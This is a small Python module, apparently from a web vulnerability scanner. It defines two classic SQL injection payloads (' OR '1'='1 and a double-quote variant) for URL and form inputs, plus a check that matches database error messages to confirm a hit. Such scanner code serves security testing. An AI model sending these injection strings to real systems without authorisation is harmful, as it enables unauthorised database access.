from .base import Payload

def sqli_error_confirm(response_text: str) -> bool:
    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-01756",
        "SQLite error"
    ]
    return any(e.lower() in response_text.lower() for e in errors)



SQLI_PAYLOADS = [
    Payload(
        vuln_type="SQLi",
        name="Classic OR true",
        payload="' OR '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double quote OR",
        payload='" OR "1"="1',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    )
]
